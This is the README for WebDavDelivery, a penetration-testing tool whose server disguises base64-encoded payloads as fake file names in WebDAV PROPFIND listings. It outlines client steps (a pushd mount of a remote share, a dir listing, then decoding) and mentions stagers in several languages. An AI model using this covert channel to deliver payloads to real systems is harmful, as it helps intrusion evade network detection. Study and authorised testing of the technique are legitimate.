WebDavDelivery
============
Author: Arno0x0x - [@Arno0x0x](https://twitter.com/Arno0x0x)


This tool is the server side of the WebDAV *PROPFIND only* requests **covert channel** used to deliver arbitrary files (*payloads, etc.*).

The tool is distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html).

Background information
----------------

Check this blog post on how and **why** I came up with the idea of using WebDAV PROPFIND only requests as a covert channel:

[Wordpress:Using WebDAV features as a covert channel](https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/)


Features
------------

WebDavDelivery features a pseudo WebDAV server, serving files from the `servedFiles`folder, by base64 encoding the file, then slicing it into 250 chars long chunks and deliver those chunks as a list of fake file names made of those chunks when listing a virtual directory composed of the real file name.

From the client side, the only thing you can do is browse directories and list their content. Say the WebDAV client wants to download a file named "binary_file.bin", all it has to do is
  1. Mount the share `\\webdavserver_ip_or_fqdn\binary_file.bin` (*eg on Windows:* `pushd \\webdavserver_ip_or_fqdn\binary_file.bin`)
  2. List the files in this directory (*eg on Windows:* `dir /b /a-d`)
  3. Concatenate all file names listed and perform some character sanitization (*essentially, replace '_' by '/' since this character is not suitable for a Windows file name*)
  4. Decode the base64 result --> you get the original file back


 Check the `stagers` directory as it contains some client side **examples** (*in VBA, PowerShell and JScript*) of how to use `webDavDelivery.py` to deliver various payloads. Just let your imagination tell you other fancy use cases of this tool :-).

How to use it
------------

Installation is pretty straight forward:
* Git clone this repository: `git clone https://github.com/Arno0x/WebDavDelivery WebDavDelivery`
* cd into the WebDAVDelivery folder: `cd WebDavDelivery`
* Give the execution rights to the main script: `chmod +x webDavDelivery.py`

Then put all the files you want to serve in the `servedFiles` directory.

Eventually, start the pseudo-server: `./webDavDelivery.py`.

**Options**:

You can tell webDavDelivery to server only one single file, no matter what the directory requested by the client is:
	`./webDavDelivery.py -f some_file_path`

The `-v` flag makes webDavDelivery more verbose about the WebDAV traffic. This can help debugging.

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*